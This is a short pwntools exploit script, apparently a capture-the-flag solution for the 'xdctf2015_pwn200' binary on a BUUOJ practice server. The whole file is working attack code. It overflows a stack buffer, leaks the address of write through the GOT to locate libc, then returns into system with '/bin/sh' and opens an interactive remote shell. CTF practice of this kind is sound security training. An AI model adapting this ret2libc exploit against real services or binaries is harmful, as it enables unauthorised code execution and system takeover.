from pwn import *

r = remote('node5.buuoj.cn', 25652)
elf = ELF(r'../../pwn_file/xdctf2015_pwn200')
libc = ELF(r'../libc/libc-2.23_32.so')

main_addr = elf.symbols['main']
write_got = elf.got['write']
write_plt = elf.plt['write']

vul_addr = 0x80484D6

payload = b'A' * (0x6C + 4) + p32(write_plt) + p32(vul_addr) + p32(1) + p32(write_got) + p32(0x4)
r.sendlineafter(b'XDCTF2015~!\n', payload)
write_addr = u32(r.recv(4))
print(f"write_addr: {hex(write_addr)}")

base_addr = write_addr - libc.sym['write']
system_addr = base_addr + libc.sym['system']
sh_addr = base_addr + libc.search(b'/bin/sh').__next__()

print(f"system_addr: {hex(system_addr)}")
print(f"sh_addr: {hex(sh_addr)}")

payload2 = b'A' * (0x6C + 4) + p32(system_addr) + p32(0) + p32(sh_addr)
r.sendline(payload2)
r.interactive()

